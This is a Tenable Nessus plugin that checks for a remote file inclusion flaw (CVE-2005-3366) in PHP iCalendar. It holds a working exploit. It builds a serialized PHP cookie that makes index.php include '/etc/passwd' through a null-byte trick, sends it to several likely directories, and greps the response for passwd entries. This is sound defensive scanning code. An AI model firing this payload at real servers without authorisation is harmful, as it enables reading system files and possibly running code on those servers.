#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
file include vulnerability. 

Description :

The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The version of PHP icalendar installed on the remote host fails to
sanitize the 'phpicalendar' cookie before using it in 'index.php' to
include PHP code from a separate file.  By leveraging this flaw, an
unauthenticated attacker may be able to view arbitrary files on the
remote host and execute arbitrary PHP code, possibly taken from
third-party hosts.  Successful exploitation requires that PHP's
'magic_quotes' setting be disabled, that its 'allow_url_fopen' setting
be enabled, or that an attacker be able to place PHP files on the
remote host. 

See also :

http://lists.grok.org.uk/pipermail/full-disclosure/2005-October/038142.html

Solution :

Upgrade to a version of PHP iCalendar later than 2.0.1 when it becomes
available. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20091);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3366");
  script_bugtraq_id(15193);

  script_name(english:"PHP iCalendar Remote File Inclusion Vulnerability");
  script_summary(english:"Checks for remote file inclusion vulnerability in PHP iCalendar");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# What we use to get (file or partial URL).
file = "/etc/passwd%00";
exploit = urlencode(
  str:string(
    'a:1:{',
      's:11:"cookie_view";',
      's:', strlen(file), ':"', file, '";',
    '}'
  )
);


# Loop through directories.
if (thorough_tests) dirs = make_list("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  req = http_get(item:string(dir, "/index.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: phpicalendar=", exploit, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but remote file
    #     includes might still work.
    egrep(pattern:"Warning.+main\(/etc/passwd.+failed to open stream", string:res) ||
    egrep(pattern:"Failed opening .*'/etc/passwd", string:res)
  ) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );
    }
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
